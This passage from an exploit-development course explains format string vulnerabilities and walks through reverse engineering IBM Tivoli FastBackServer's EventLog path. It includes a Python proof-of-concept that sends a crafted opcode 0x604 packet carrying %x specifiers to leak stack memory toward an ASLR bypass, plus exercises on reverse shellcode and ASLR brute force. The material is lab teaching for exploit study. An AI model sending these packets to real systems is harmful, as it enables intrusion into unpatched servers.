+Since the FastBackServer process is automatically restarted if it crashes, we may opt to bypass ASLR through brute force rather than a leak.
+Create an exploit that will attempt to brute force ASLR instead of using the leak. Perform a calculation to show how long it will take to perform an exploitation with a greater than 50% chance.
+Extra Mile
+Instead of using a shellcode decoding routine written in ROP, develop a custom reverse shellcode in assembly that does not contain any of the bad characters associated with the memory corruption vulnerability exploited in this module.
+Extra Mile
+In the C:\tools\aslr folder of the Windows 10 machine, you'll find an application called customsvr01.exe.
+This application is compiled with DEP and ASLR. Reverse engineer it and find a vulnerability that will allow you to bypass ASLR. Next, find and exploit a memory corruption vulnerability in the same application to achieve code execution.
+10.5. Wrapping Up
+ASLR and DEP work together to form a strong defense, requiring us to leverage multiple vulnerabilities to craft a stable exploit.
+In this module, we located a logical vulnerability that we used to develop an ASLR bypass by resolving arbitrary functions. We then crafted a ROP chain to call WriteProcessMemory and copy our shellcode into an executable memory page of libeay32IBM019.dll, bypassing DEP. Along the way, we managed bad characters in the shellcode by developing a dynamic encoding scheme and a ROP chain for runtime decoding.
+Putting these pieces together, we overcame the operating system's ASLR and DEP defense mechanisms to obtain a reverse shell. 
+11. Format String Specifier Attack Part I
+In previous modules, we leveraged memory corruption vulnerabilities that manifested themselves as stack buffer overflows by using various functions with unsanitized arguments. We have more vulnerabilities to discover, however.
+In this module, we will investigate a different type of vulnerability called format string specifier bug.1
+We are going to leverage a format string specifier bug to bypass Address Space Layout Randomization (ASLR). Due to the nature of this vulnerability and logic involved, we will need to cover more theory and perform additional reverse engineering.
+In the previous modules of this course, we developed exploits that obtained code execution by overwriting a large amount of data on the stack and bypassed ASLR by abusing insecure logic.
+With the vulnerability in this module, we will take a more advanced approach and develop a so-called read primitive. At a high-level, a read primitive is a part of the exploit that allows us to leak or read semi-arbitrary memory. The amount of work and attention to detail we have to put in is greater, but we will be rewarded with a powerful way to bypass ASLR.
+1 (OWASP, 2020), https://owasp.org/www-community/attacks/Format_string_attack
+11.1. Format String Attacks
+Since this is a different type of vulnerability, we have to cover some theory about format strings and format string specifiers, as well as how these can be abused to create an exploit to bypass a mitigation like ASLR.
+11.1.1. Format String Theory
+The concept of format strings is found in many programming languages that allow dynamic processing and presentation of content in strings.
+This concept consists of two elements. The first is the format string and the other is a format function that parses the format string and outputs the final product.
+There are multiple format string functions. Some examples in C++ are printf,1 sprintf,2 and vsnprintf.3 The major differences between these functions are in the way arguments are supplied and how the output string is returned.
+The simplest format string function is printf, which has the prototype shown in Listing 1.
+int printf(
+ const char *format [,
+ argument]...
+);
+Listing 1 - Function prototype of printf
+The first argument, *format, is a pointer to the format string that determines how the content of the subsequent arguments are interpreted.
+This interpretation is done according to the format specifiers present in the format string. Format specifiers are processed from left to right in the format string, and the format string function performs the specified formatting on the associated arguments.
+Format specifiers are used to translate data into a specific format such as hex, decimal, or ASCII, as well as to configure their appearance in the final string.
+To better understand format specifiers, we must investigate their syntax, which is presented in Listing 2.4
+%[flags][width][.precision][size]type
+Listing 2 - Format string syntax
+Format specifiers start with the symbol % followed by flags, width, precision, and size, which all reflect the look, size, and amount of output. They are all optional.
+Type is mandatory, and there are several types to choose from.5 Examples of most common type specifiers are given in Listing 3.
+Type - Argument    -    Output format
+x      Integer          Unsigned hexadecimal integer
+i      Integer          Unsigned decimal integer
+e      Floating-point   Signed value that has the form [ - ]d.dddd e [sign]dd
+s      String           Specifies a character string up to the first null character
+n      Pointer          Number of characters that are successfully written so far
+Listing 3 - Common type specifiers
+As an example, Listing 4 shows a simple format string that has the two type specifiers "x" and "s".
+"This is a value in hex %x and a string %s"
+Listing 4 - Format string example
+When this format string is used with a format string function like printf, the first format specifier will be replaced with the content of the second argument and interpreted as a hex value. The second format specifier will be replaced with the third argument and interpreted as a string.
+Listing 5 shows how the arguments 4660 and "I love cats!" are supplied to printf and the resulting string.
+printf("This is a value in hex: %x and a string: %s", 4660, "I love cats!")
+Output:
+This is a value in hex: 0x1234 and a string: I love cats!
+Listing 5 - Using a format string
+The number of format specifiers should match the number of arguments. If there are more arguments than format string specifiers, they are left unused. But if there are more format string specifiers than arguments, security issues arise.
+Most format functions work similarly, but arguments can be supplied from an array instead of individually.
+This section has provided us with the basic knowledge about how format specifiers, format strings, and format functions work. Next, we'll discuss how they can be abused.
+1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/printf/
+2 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/sprintf/
+3 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/vsnprintf/
+4 (Microsoft, 2019), https://docs.microsoft.com/en-us/cpp/c-runtime-library/format-specification-syntax-printf-and-wprintf-functions?view=msvc-160
+5 (MSDN, 2015), https://msdn.microsoft.com/en-us/library/hf4y5e3w.aspx
+11.1.2. Exploiting Format String Specifiers
+As mentioned in the last section, if the number of format string specifiers is larger than the number of arguments, security vulnerabilities can arise. In this section, we are going to look into how this happens through small custom C++ applications.
+Listing 6 shows C++ code that calls the printf function with a format string containing four format specifiers.
+#include "pch.h"
+#include <iostream>
+#include <Windows.h>
 
-```
+int main(int argc, char **argv)
+{
+	printf("This is your input: 0x%x, 0x%x, 0x%x, 0x%x\n", 65, 66, 67, 68);
+	return 0;
+}
+Listing 6 - C++ code calling printf with matching amount of arguments
+When the code is compiled and executed, the application will print the format string with the four decimal values converted to hexadecimal values and replace the format specifiers.
+In C:\Tools\format, we can find a compiled version of the application that produces the output displayed in Listing 7.
+C:\Tools\format> FormatTest1.exe
+This is your input: 0x41, 0x42, 0x43, 0x44
+Listing 7 - Executing the proof of concept prints four hexadecimal values
+As shown in the output from the application, the four numbers are converted and inserted correctly. This is correct usage of format strings and no vulnerability is present.
+In Listing 8, we find a modified version of the previous code. The number of arguments supplied to the format string has been reduced from four to two, while the format string contains the same number of specifiers as before.
+#include "pch.h"
+#include <iostream>
+#include <Windows.h>
+
+int main(int argc, char **argv)
+{
+	printf("This is your input: 0x%x, 0x%x, 0x%x, 0x%x\n", 65, 66);
+	return 0;
+}
+Listing 8 - C++ code calling printf with to few arguments
+This leaves us wondering what values printf will print to the console when it executes.
+To find out, let's execute a compiled version of the application from C:\Tools\format. on the Windows 10 client machine. We should obtain the output shown below.
+C:\Tools\format> FormatTest2.exe
+This is your input: 0x41, 0x42, 0x2e1022, 0x1afdc4
+Listing 9 - Executing the updated proof of concept
+The output in Listing 9 shows the decimal values 65 and 66 were converted to hexadecimal, as before. The last two highlighted values stem from the missing arguments. Both seem similar to memory addresses.
+We'll recall from previous modules that in the __stdcall calling convention, arguments are passed to functions on the stack. In our current case, printf expects five arguments; the format string and four values according to the format string specifiers.
+When printf is executed, it uses the format string and the two supplied decimal values. For the two remaining format specifiers, the two values that happen to be on the stack will be used.
+If the values happen to be addresses inside a module or stack addresses, we may be able to leverage this into an ASLR bypass.
+To verify this theory, let's modify the C++ code to enable us to inspect relevant memory in WinDbg. The updated code is shown in Listing 10.
+#include "pch.h"
+#include <iostream>
+#include <Windows.h>
+
+int main(int argc, char **argv)
+{
+	std::cout << "Press ENTER to start...\n";
+	std::cin.get();
+	
+	printf("This is your input: 0x%x, 0x%x, 0x%x, 0x%x\n", 65, 66);
+
+	DebugBreak();
+	
+	return 0;
+}
+Listing 10 - C++ code calling printf while being debugged
+We'll observe two changes. First, the application will pause and wait for us to press any key before executing. This will allow us to attach WinDbg to the process before printf is called.
+The second change is a call to the DebugBreak1 function. This call will execute an INT3 instruction that WinDbg catches, enabling us to inspect the memory of the application.
+Let's run the modified application and attach WinDbg when prompted, pressing any key afterwards to resume. This will execute printf, then break into the execution flow.
+C:\Tools\format> FormatTest3.exe
+Press ENTER to start...
+
+This is your input: 0x41, 0x42, 0xfcfeb0, 0x2e5658
+Listing 11 - Executing the updated PoC with debugger attached
+Switching to WinDbg, we can list the stack boundaries as highlighted in Listing 12 to check if the first highlighted value printed in Listing 11 is indeed a stack address.
+(e7c.144): Break instruction exception - code 80000003 (first chance)
+*** WARNING: Unable to verify checksum for C:\Tools\format\FormatTest3.exe
+*** ERROR: Module load completed but symbols could not be loaded for C:\Tools\format\FormatTest3.exe
+eax=00000011 ebx=011c1000 ecx=002e9ebf edx=00000030 esi=0031291c edi=012344b0
+eip=753b1072 esp=00fcfe64 ebp=00fcfe68 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+KERNELBASE!wil::details::DebugBreak+0x2:
+753b1072 cc              int     3
+
+0:000> !teb
+TEB at 011c2000
+    ExceptionList:        00fcfea0
+    StackBase:            00fd0000
+    StackLimit:           00fcd000
+    SubSystemTib:         00000000
+    FiberData:            00001e00
+...
+Listing 12 - Inspecting first value in WinDbg
+Clearly, printf printed a stack address to the console due to a missing argument.
+We can similarly unassemble memory at the second printed value from Listing 11.
+0:000> u 0x2e5658 L2
+FormatTest3+0x5658:
+002e5658 83c40c          add     esp,0Ch
+002e565b 8bf0            mov     esi,eax
+
+0:000> !vprot 0x2e5658
+BaseAddress:       002e5000
+AllocationBase:    002e0000
+AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
+RegionSize:        0001c000
+State:             00001000  MEM_COMMIT
+Protect:           00000020  PAGE_EXECUTE_READ
+Type:              01000000  MEM_IMAGE
+Listing 13 - Inspecting second value in WinDbg
+In this case, the value is an address inside the code section of FormatTest3. We can use !vprot to determine that it is executable.
+At this point, we've leveraged a vulnerable format string used in an application to discover both a stack address and an address inside the main executable. We may be able to use these addresses to bypass ASLR and subsequently DEP.
+This is a simple example of how we could exploit format strings, however, it relies on a programming error that we're unlikely to find in a real-world scenario.
+There are two important items to note here. First, the content printed by printf depends on what happens to be on the stack, so its reliability can vary. Second, to actively exploit a format string vulnerability in a real application, we'll need to influence either the format string itself or the number of arguments.
+Let's use what we've learned about format string vulnerabilities to practice bypassing ASLR in the following sections.
+Exercise
+1.	Use the applications FormatTest1.exe, FormatTest2.exe, and FormatTest3.exe, located on the Windows 10 machine in the folder C:\Tools\FormatString, to repeat the analysis presented here.
+1 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugbreak
+11.2. Attacking IBM Tivoli FastBackServer
+Let's revisit IBM Tivoli FastBackServer since it contains multiple format string specifier bugs, some of which may be leveraged to bypass ASLR.
+Searching online for format string specifier bugs in the application, we discover multiple vulnerabilities, but no proofs of concept.
+One interesting advisory comes from Zero Day Initiative (ZDI). It mentions a vulnerable function named _EventLog.1 The public vulnerability report has a few technical details, but they are aimed at a different network port than the one we previously used.
+In the next few sections, we will investigate whether the EventLog function contains a format string specifier vulnerability we can exploit, and whether we can trigger it from the previously-used network port.
+1 (Zero Day Initiative, 2010), https://www.zerodayinitiative.com/advisories/ZDI-10-185/
+
+11.2.1. Investigating the EventLog Function
+Next, we'll locate the EventLog function and determine if it contains any vulnerable format string function calls. We also need to determine how to trigger such a vulnerability remotely.
+We know from previous modules that the FXCLI_OraBR_Exec_Command function contains a multitude of branches, which in turn contain several vulnerabilities. We could spend time reverse engineering each branch to locate possible vulnerabilities, but for the sake of efficiency, in this module we are going to begin our analysis from the "_EventLog" function name.
+Since we're beginning our analysis with only a function name, we will likely gain the fastest insight through static analysis.
+Let's open our previously-analyzed FastBackServer executable in IDA Pro and search for any function called "_EventLog" using Jump > Jump to function... and use the quick filter option.
+Fortunately, we only get two results, as shown in Figure 1 - one of which is an exact match.
+ 
+Figure 1: Search results for _EventLog
+Following the highlighted function, we first encounter a couple of checks, after which we locate the basic block shown in Figure 2.
+ 
+Figure 2: Basic block with call to _ml_vsnprintf
+The _ml_vsnprintf function is a trampoline into __vsnprintf, which turns out to be a massive function. Given the names of the functions, we can assume that this is an embedded implementation of the vsnprintf1 format string function.
+The function prototype of vsnprintf, which is shown in Listing 14, lists four arguments with similar names to those identified by IDA Pro.
+int vsnprintf(
+  char *s,
+  size_t n,
+  const char *format,
+  va_list arg
+);
+Listing 14 - Function prototype for vsnprintf
+The vsnprintf function is a bit more complicated than printf. Instead of printing the content to the console, the formatted string is stored in the buffer that is passed as the first argument (*s).
+The second argument (n) is the maximum number of bytes of the formatted string; if the formatted string is longer than this value, it will be truncated. The third argument (*format) is the format string itself, and the fourth argument (arg) is a pointer to an array containing the arguments for the format string specifiers.
+From an attacker's perspective, the differences between printf and vsnprintf are important, but we can nevertheless exploit this function under the right circumstances.
+ 
+Figure 3: Basic block with call to _ml_vsnprintf
+As IDA Pro shows, _ml_vsnprintf accepts four arguments. The second argument, labeled "Count", contains the static value 0x400. This will limit the output size of any attack we perform.
+The three remaining arguments are all passed to _EventLog as dynamic values, and thus may be under our control.
+The most important argument for us to focus on is the format string itself, which may either be modified by us or passed as a static string containing many format specifiers.
+Dynamically modifying the format string in an unintended way is more likely to escape the review of a developer. If we can locate a code path that will allow us to execute a format string function where the resultant formatted string is used as a format string for a second format string function, we may be able to obtain a dynamically-created format string.
+For example, let's suppose _ml_vsnprintf is called with a format string containing a string format specifier ("%s"), and we control the arguments for it. In this case, we could provide the string "%x%x%x%x" as an argument, which would create a new format string as illustrated in Listing 15.
+Before _ml_vsnprintf:
+"This is my string: %s"
+
+After _ml_vsnprintf:
+"This is my string: %x%x%x%x"
+Listing 15 - Creating a format string
+If the formatted string following the call to _ml_vsnprintf is reused as a format string in a subsequent format string function, we may be able to recreate the vulnerable condition we observed in the initial printf example.
+The vulnerable condition would happen if we could dynamically modify the format string to contain an arbitrary number of format specifiers. If we can find a location where the string formatted by _ml_vsnprintf is reused, we may be able to discover a vulnerability.
+Before we go into further details on the located call to _ml_vsnprintf, let's search for a subsequent format string function that may reuse the output string.
+Following the call to _ml_vsnprintf inside _EventLog, we can move down a couple of basic blocks and find two code paths that both invoke the _EventLog_wrapted function. One of these code blocks is displayed in Figure 4.
+ 
+Figure 4: Call to _EventLog_wrapted
+While we don't yet know what this function does, the automatic comment given to the third argument ("Format") is intriguing.
+For a vulnerability to exist, _EventLog_wrapted must call a format string function with our resulting format string containing an arbitrary number of format specifiers. Since we'll be dealing with many dependencies and basic blocks, let's take advantage of some dynamic analysis.
+We'll need to ensure that the first format string supplied to _EventLog and used by _ml_vsnprintf contains at least one string format specifier. A string format specifier is required for us to generate an arbitrary string, which is used in the subsequent format string function inside _EventLog_wrapted.
+There are a lot of details to manage, so we will split up the work.
+In the next section, we will learn how to invoke _EventLog with a supplied format string. Then we will analyze how _EventLog_wrapted uses a dynamically-created format string.
+Exercise
+1.	Use IDA Pro to locate the _EventLog function and ensure you understand the arguments it accepts.
+1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/vsnprintf/
+11.2.2. Reverse Engineering a Path
+In this section, we'll find a way to reach the _EventLog function by sending a network packet. The format string supplied to _EventLog must also contain a string format specifier.
+Having worked with this application in previous modules, we know that the FXCLI_OraBR_Exec_Command function contains many different code paths to choose from. We need to find one that fulfills our requirements and then create a proof of concept that triggers it.
+We can perform a cross-reference on _EventLog to find that it is called from 7496 places. There are two ways of solving this, either manually or through automation.
+In the paid version of IDA Pro it's possible to leverage the embedded Python scripting library called IDAPython1 through a custom script like idapathfinder.2
+Unfortunately, the IDAPython library is not accessible in free version of IDA Pro. Instead, we would have to reverse engineer each path that FXCLI_OraBR_Exec_Command takes to look for a call to _EventLog. Such a path must also provide an exploitable format string.
+Because this task can be quite time consuming, we'll move directly to the match that we found for this course. The code path from FXCLI_OraBR_Exec_Command to _EventLog through the AGI_S_GetAgentSignature function allows us to trigger _EventLog from a network packet and is the one we choose.
+There are two reasons for choosing this path. First, it only contains one nested function, and second, the format string supplied to _EventLog by AGI_S_GetAgentSignature contains a string specifier.
+The interesting call inside AGI_S_GetAgentSignature is shown in Figure 5.
+ 
+Figure 5: Call to _EventLog from AGI_S_GetAgentSignature
+The format string is truncated in the basic block, but we can jump to the address of the variable containing it to inspect the full string, as displayed in Figure 6.
+ 
+Figure 6: Full format string
+In theory, we have found an ideal code path for our exploit. Next, we need to write a proof of concept that forces this path to be taken.
+We can reuse our code framework from previous modules, but we need to locate the opcode for AGI_S_GetAgentSignature. We'll perform a cross-reference and find that it is only called by FXCLI_OraBR_Exec_Command.
+Once we reach the call into AGI_S_GetAgentSignature and go one basic block backward, we find the comparison shown in Figure 7.
+ 
+Figure 7: Opcode 0x604 to trigger AGI_S_GetAgentSignature
+From previous modules, we know that the value at offset var_61B30 is the opcode. This provides us with the opcode value 0x604 and we can create the initial proof of concept as given in Listing 16.
+import socket
+import sys
+from struct import pack
+
+def main():
+	if len(sys.argv) != 2:
+		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
+		sys.exit(1)
+	
+	server = sys.argv[1]
+	port = 11460
+	
+	# psAgentCommand
+	buf = pack(">i", 0x400)
+	buf += bytearray([0x41]*0xC)
+	buf += pack("<i", 0x604)  # opcode
+	buf += pack("<i", 0x0)    # 1st memcpy: offset
+	buf += pack("<i", 0x100)  # 1st memcpy: size field
+	buf += pack("<i", 0x100)  # 2nd memcpy: offset
+	buf += pack("<i", 0x100)  # 2nd memcpy: size field
+	buf += pack("<i", 0x200)  # 3rd memcpy: offset
+	buf += pack("<i", 0x100)  # 3rd memcpy: size field
+	buf += bytearray([0x41]*0x8)
+
+	# psCommandBuffer
+	buf += b"A" * 0x100  
+	buf += b"B" * 0x100 
+	buf += b"C" * 0x100 
+
+  # Padding
+	buf += bytearray([0x41]*(0x404-len(buf)))
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((server, port))
+	
+	s.send(buf)
+	s.close()
+
+	print("[+] Packet sent")
+	sys.exit(0)
+
+
+if __name__ == "__main__":
+ 	main()
+Listing 16 - Initial proof of concept for opcode 0x604
+To test it, let's set a breakpoint on the comparison of the opcode found at the address 0x56cdf5 in FastBackserver and send the packet.
+0:080> bp 56cdf5
+
+0:080> g
+Breakpoint 0 hit
+eax=060fc8f0 ebx=060fae50 ecx=00000604 edx=00000001 esi=060fae50 edi=00669360
+eip=0056cdf5 esp=0d55e334 ebp=0d5bfe98 iopl=0         nv up ei ng nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
+FastBackServer!FXCLI_OraBR_Exec_Command+0x93f:
+0056cdf5 81bdd0e4f9ff04060000 cmp dword ptr [ebp-61B30h],604h ss:0023:0d55e368=00000604
+Listing 17 - Breakpoint on opcode 0x604 comparison
+Listing 17 shows that our initial proof of concept will trigger the correct opcode path.
+Now we can continue execution until the call into AGI_S_GetAgentSignature. If we dump the first three arguments, we find that they contain the three parts of our psCommandBuffer buffer.
+eax=0d5ad980 ebx=060fae50 ecx=0d5b9cf0 edx=0d5b3b30 esi=060fae50 edi=00669360
+eip=0056df5c esp=0d55e324 ebp=0d5bfe98 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+FastBackServer!FXCLI_OraBR_Exec_Command+0x1aa6:
+0056df5c e862d6fdff      call    FastBackServer!AGI_S_GetAgentSignature (0054b5c3
+
+0:006> dd poi(esp) L4
+0d5b3b30  41414141 41414141 41414141 41414141
+
+0:006> dd poi(esp+4) L4
+0d5b9cf0  42424242 42424242 42424242 42424242
+
+0:006> dd poi(esp+8) L4
+0d5ad980  43434343 43434343 43434343 43434343
+Listing 18 - Arguments to AGI_S_GetAgentSignature
+We're off to a great start since we have absolute control of three arguments to the function.
+We'll step into the function and find that, by default, we follow the code path that lets us reach the call into _EventLog with the format string containing a string format specifier:
+eax=0d5b3b30 ebx=060fae50 ecx=02a4d738 edx=00976a78 esi=060fae50 edi=00669360
+eip=0054b69b esp=0d55e2dc ebp=0d55e31c iopl=0         nv up ei ng nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
+FastBackServer!AGI_S_GetAgentSignature+0xd8:
+0054b69b e8914df3ff      call    FastBackServer!EventLog (00480431)
+
+0:006> dds esp L4
+0d55e2dc  00000008
+0d55e2e0  00000019
+0d55e2e4  008118a4 FastBackServer!VM_hInVMUpdateProtectionSemaphore_LastTaken+0x1a520
+0d55e2e8  0d5b3b30
+
+0:006> da 008118a4 
+008118a4  "AGI_S_GetAgentSignature: couldn'"
+008118c4  "t find agent %s."
+
+0:006> dd 0d5b3b30
+0d5b3b30  41414141 41414141 41414141 41414141
+...
+Listing 19 - Arguments to _EventLog
+When we step into _EventLog, we once again find that by default, execution takes us to the call to _ml_vsnprintf.
+Before calling _ml_vsnprintf, let's dump the arguments from the stack to verify that our input is used.
+eax=008118a4 ebx=060fae50 ecx=0d55ded4 edx=0d55e2e8 esi=060fae50 edi=00669360
+eip=0048048f esp=0d55dea8 ebp=0d55e2d4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!EventLog+0x5e:
+0048048f e89fac1d00      call    FastBackServer!ml_vsnprintf (0065b133)
+
+0:006> dds esp L4
+0d55dea8  0d55ded4
+0d55deac  00000400
+0d55deb0  008118a4 FastBackServer!VM_hInVMUpdateProtectionSemaphore_LastTaken+0x1a520
+0d55deb4  0d55e2e8
+
+0:006> da 008118a4 
+008118a4  "AGI_S_GetAgentSignature: couldn'"
+008118c4  "t find agent %s."
+
+0:006> dd poi(poi(esp+c)) L4
+0d5b3b30  41414141 41414141 41414141 41414141
+Listing 20 - Arguments to ml_vsnprintf
+Listing 20 displays the first argument as the destination buffer and the third argument as the format string.
+The fourth argument, according to the function prototype, is an array containing the arguments. Since there is only one format string specifier present, an array containing one element is used.
+Since the format specifier used in the format string is "%s", the argument is interpreted as a pointer to a character array. We can verify the contents of the argument through a double dereference, as shown at the bottom of the listing.
+We expect that ml_vsnprintf will insert the A's into the format string. Let's verify this by stepping over the call and dumping the contents of the destination buffer.
+0:006> p
+eax=0000012e ebx=060fae50 ecx=0d55de68 edx=0d55e001 esi=060fae50 edi=00669360
+eip=00480494 esp=0d55dea8 ebp=0d55e2d4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!EventLog+0x63:
+00480494 83c410          add     esp,10h
+
+0:006> da 0d55ded4
+0d55ded4  "AGI_S_GetAgentSignature: couldn'"
+0d55def4  "t find agent AAAAAAAAAAAAAAAAAAA"
+0d55df14  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d55df34  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d55df54  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d55df74  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d55df94  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d55dfb4  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d55dfd4  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+0d55dff4  "AAAAAAAAAAAAA."
+Listing 21 - Formatted string after call to vsnprintf
+As expected, we find that our input buffer has been inserted into the format string as A's.
+We have now achieved part of our goal. We found a way to reach the call to _ml_vsnprintf from a network packet, but the formatted string shown in Listing 21 is not of much use, since it only contains A's.
+Next, we'll modify our proof of concept to send a network packet that contains the "%x" format specifier instead of A's, as shown in Listing 22.
+...
+# psCommandBuffer
+buf += b"%x" * 0x80  
+buf += b"B" * 0x100 
+buf += b"C" * 0x100 
+...
+Listing 22 - Replace A's with %x's in the network packet
+Ideally, we would set a breakpoint on the call to ml_vsnprintf inside _EventLog, but it is called by so many other functions that it is impossible to trigger it correctly.
+Instead, we'll set a breakpoint in AGI_S_GetAgentSignature on the call into _EventLog, then single step until we reach the call to ml_vsnprintf.
+0:006> bc *
+
+0:006> bp FastBackServer!AGI_S_GetAgentSignature+0xd8
+
+0:006> g
+Breakpoint 0 hit
+eax=0d9b3b30 ebx=060fae50 ecx=02a4d738 edx=00976a78 esi=060fae50 edi=00669360
+eip=0054b69b esp=0d95e2dc ebp=0d95e31c iopl=0         nv up ei ng nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
+FastBackServer!AGI_S_GetAgentSignature+0xd8:
+0054b69b e8914df3ff      call    FastBackServer!EventLog (00480431)
+
+0:006> t
+...
+eax=008118a4 ebx=060fae50 ecx=0d95ded4 edx=0d95e2e8 esi=060fae50 edi=00669360
+eip=0048048f esp=0d95dea8 ebp=0d95e2d4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!EventLog+0x5e:
+0048048f e89fac1d00      call    FastBackServer!ml_vsnprintf (0065b133)
+
+0:006> dds esp L4
+0d95dea8  0d95ded4
+0d95deac  00000400
+0d95deb0  008118a4 FastBackServer!VM_hInVMUpdateProtectionSemaphore_LastTaken+0x1a520
+0d95deb4  0d95e2e8
+
+0:006> da poi(poi(esp+c))
+0d9b3b30  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
+0d9b3b50  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
+0d9b3b70  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
+0d9b3b90  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
+0d9b3bb0  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
+0d9b3bd0  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
+0d9b3bf0  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
+0d9b3c10  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
+0d9b3c30  ""
+Listing 23 - 0x80 %x format specifiers
+We'll note from the last output of Listing 23 that the argument string to vsnprintf consists of 128 (0x80) hexadecimal format string specifiers.
+In Listing 24, we'll step over the call to the format string function and find that the formatted string now contains several hexadecimal format string specifiers.
+0:006> p
+eax=0000012e ebx=060fae50 ecx=0d95de68 edx=0d95e001 esi=060fae50 edi=00669360
+eip=00480494 esp=0d95dea8 ebp=0d95e2d4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!EventLog+0x63:
+00480494 83c410          add     esp,10h
+
+0:006> da 0d95ded4
+0d95ded4  "AGI_S_GetAgentSignature: couldn'"
+0d95def4  "t find agent %x%x%x%x%x%x%x%x%x%"
+0d95df14  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95df34  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95df54  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95df74  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95df94  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95dfb4  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95dfd4  "x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%"
+0d95dff4  "x%x%x%x%x%x%x."
+Listing 24 - Hex specifiers are inserted into the string
+We obtained our first tangible indication that we can perform a format string specifier attack.
+Now we can craft a format string with almost-arbitrary format string specifiers. Our only limitation comes from the number of bytes written by vsnprintf, which is hardcoded to 0x400 through its second argument.
+In the next section, we'll develop a better understanding of how the EventLog_wrapted function uses the generated format string.
+Exercises
+1.	Follow the analysis and create a proof of concept that triggers the correct opcode and executes _EventLog.
+2.	Modify the proof of concept to obtain a formatted string containing format string specifiers.
+3.	Is it possible to use different format string specifiers like "%s"? What what happens if we let execution continue afterwards?
+1 (Hex-Rays, 2020), https://github.com/idapython/src
+2 (Google, 2013), https://code.google.com/archive/p/idapathfinder/
+11.2.3. Invoke the Specifiers
+In this section, we will continue our analysis and dig into EventLog_wrapted to uncover if (and how) our formatted string is used.
+Let's start with the formatted string following the call to ml_vsnprintf. Figure 8 shows the interesting code following the call.
+ 
+Figure 8: Detecting length of format string
+We'll notice three highlighted items above. First, the formatted string is stored at the offset "Str" from EBP. Second, the static value 0xC4 is stored in the offset var_41C from EBP.
+The last highlighted code section calls the _ml_strbytelen function, which is a wrapper for an embedded version of strlen.1 The call's purpose is to determine the length of the formatted string. The result is stored at offset var_40C from EBP.
+To find the length of the format string, we'll single step to the call into _ml_strbytelen and step over it:
+eax=0d95ded4 ebx=060fae50 ecx=0d95de68 edx=0d95ded4 esi=060fae50 edi=00669360
+eip=004804cc esp=0d95deb4 ebp=0d95e2d4 iopl=0         nv up ei pl nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
+FastBackServer!EventLog+0x9b:
+004804cc e8aaaa1d00      call    FastBackServer!ml_strbytelen (0065af7b)
+
+0:006> p
+eax=0000012e ebx=060fae50 ecx=0d95ded4 edx=7eff0977 esi=060fae50 edi=00669360
+eip=004804d1 esp=0d95deb4 ebp=0d95e2d4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!EventLog+0xa0:
+004804d1 83c404          add     esp,4
+Listing 25 - Length of format string
+The length was found to be 0x12E. Next, the application stores it and moves execution to the basic block shown in Figure 9.
+ 
+Figure 9: Format string size comparison
+The comparison is between the length of the formatted string and the static value 0xC4. Our format string is longer, so the jump is not taken, leading us to a basic block that performs several modifications to our format string before calling EventLog_wrapted.
+To understand what changes happen to the formatted string, we can single step to the call and inspect the arguments:
+eax=00000019 ebx=060fae50 ecx=00000008 edx=0d95ded4 esi=060fae50 edi=00669360
+eip=00480568 esp=0d95deac ebp=0d95e2d4 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
